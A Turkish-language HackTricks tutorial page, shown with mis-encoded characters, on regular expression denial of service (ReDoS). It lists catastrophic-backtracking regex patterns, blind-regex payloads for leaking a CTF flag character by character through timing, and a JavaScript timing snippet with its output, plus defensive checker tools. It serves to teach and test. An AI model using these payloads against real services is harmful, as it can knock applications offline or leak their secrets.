# DÃ¼zenli Ä°fade Hizmet DÄ±ÅŸÄ± BÄ±rakma - ReDoS

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

# DÃ¼zenli Ä°fade Hizmet DÄ±ÅŸÄ± BÄ±rakma (ReDoS)

Bir **DÃ¼zenli Ä°fade Hizmet DÄ±ÅŸÄ± BÄ±rakma (ReDoS)**, dÃ¼zenli ifadelerin (metinde desenleri aramak ve eÅŸleÅŸtirmek iÃ§in bir yol) nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndaki zayÄ±flÄ±klardan faydalanÄ±ldÄ±ÄŸÄ±nda meydana gelir. Bazen, dÃ¼zenli ifadeler kullanÄ±ldÄ±ÄŸÄ±nda, Ã¶zellikle Ã§alÄ±ÅŸtÄ±klarÄ± metin parÃ§asÄ± bÃ¼yÃ¼dÃ¼kÃ§e, Ã§ok yavaÅŸ hale gelebilirler. Bu yavaÅŸlÄ±k, metin boyutunda bile kÃ¼Ã§Ã¼k artÄ±ÅŸlarla hÄ±zla bÃ¼yÃ¼yebilir. SaldÄ±rganlar, bu sorunu kullanarak dÃ¼zenli ifadeler kullanan bir programÄ±n uzun sÃ¼re dÃ¼zgÃ¼n Ã§alÄ±ÅŸmasÄ±nÄ± engelleyebilir.

## Sorunlu Regex Naif AlgoritmasÄ±

**DetaylarÄ± [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)** adresinde kontrol edin.

## KÃ¶tÃ¼ AmaÃ§lÄ± Regexler <a href="#evil-regexes" id="evil-regexes"></a>

KÃ¶tÃ¼ bir dÃ¼zenli ifade deseni, bir DoS'a neden olacak ÅŸekilde oluÅŸturulmuÅŸ girdide takÄ±lÄ± kalabilen bir desendir. KÃ¶tÃ¼ amaÃ§lÄ± regex desenleri genellikle tekrarlayan gruplama ve tekrarlama veya tekrarlayan grup iÃ§inde Ã¶rtÃ¼ÅŸme iÃ§eren desenler iÃ§erir. KÃ¶tÃ¼ desen Ã¶rnekleri ÅŸunlarÄ± iÃ§erir:

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} iÃ§in x > 10

TÃ¼m bunlar, `aaaaaaaaaaaaaaaaaaaaaaaa!` girdisine karÅŸÄ± savunmasÄ±zdÄ±r.

## ReDoS YÃ¼kleri

### ReDoS AracÄ±lÄ±ÄŸÄ±yla Dize SÄ±zdÄ±rma

Bir CTF (veya hata Ã¶dÃ¼lÃ¼) sÄ±rasÄ±nda, hassas bilgilerin (bayrak) eÅŸleÅŸtiÄŸi Regex'i **siz kontrol edebilirsiniz**. ArdÄ±ndan, bir Regex eÅŸleÅŸirse **sayfayÄ± dondurmanÄ±z (zaman aÅŸÄ±mÄ± veya daha uzun iÅŸleme sÃ¼resi)** ve eÅŸleÅŸmezse **dondurmamanÄ±z** yararlÄ± olabilir. Bu ÅŸekilde, dizeyi **karakter karakter** sÄ±zdÄ±rabilirsiniz:

* [**Bu gÃ¶nderide**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) ÅŸu ReDoS kuralÄ±nÄ± bulabilirsiniz: `^(?=<flag>)((.*)*)*salt$`
* Ã–rnek: `^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* [**Bu Ã§Ã¶zÃ¼mde**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html) ÅŸunu bulabilirsiniz: `<flag>(((((((.*)*)*)*)*)*)*)!`
* [**Bu Ã§Ã¶zÃ¼mde**](https://ctftime.org/writeup/25869) ÅŸunu kullandÄ±: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### GiriÅŸ ve Regex'i Kontrol Eden ReDoS

AÅŸaÄŸÄ±dakiler, **giriÅŸi** ve **regex'i** kontrol ettiÄŸiniz **ReDoS** Ã¶rnekleridir:
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## AraÃ§lar

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## Referanslar
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
